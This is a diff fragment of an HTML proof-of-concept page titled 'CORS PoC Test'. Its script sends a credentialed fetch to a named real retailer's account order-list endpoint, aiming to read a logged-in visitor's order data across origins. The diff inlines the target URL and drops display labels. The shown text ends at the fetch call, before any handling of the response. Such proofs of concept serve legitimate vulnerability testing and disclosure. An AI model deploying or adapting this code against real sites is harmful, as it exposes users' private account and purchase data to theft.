@@ -4,15 +4,10 @@
 <body>
 <h2>CORS PoC Test</h2>
 <p>Status: <span id="status" style="color:orange">Testing...</span></p>
-<p>Response Headers:</p>
 <pre id="headers" style="background:#111;color:#0f0;padding:10px"></pre>
-<p>Data (first 500 chars):</p>
 <pre id="data" style="background:#111;color:#0f0;padding:10px"></pre>
-
 <script>
-const TARGET = 'https://global.jbl.com/on/demandware.store/Sites-JBL-GBL-Site/en_US/Account-GetOrderList';
-
-fetch(TARGET, {
+fetch('https://global.jbl.com/on/demandware.store/Sites-JBL-GBL-Site/en_US/Account-GetOrderList', {
   credentials: 'include',
   headers: { 'Accept': 'application/json' }
 })
